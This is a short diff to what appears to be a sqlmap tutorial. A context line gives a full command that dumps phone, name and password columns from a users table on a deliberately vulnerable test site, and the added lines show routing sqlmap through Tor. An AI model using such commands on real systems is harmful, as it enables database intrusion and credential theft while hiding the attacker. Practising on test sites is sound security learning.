@@ -28,5 +28,9 @@ As usual, use –D for database, -T for table, -C for column and –dump for dat
 
 > sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' -D acuart -T users -C phone,name,pass --dump
 
+Add tor proxy. Type _tor_ in terminal and then 
+
+> sqlmap .....  --tor
+
 All options on sqlmap page
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
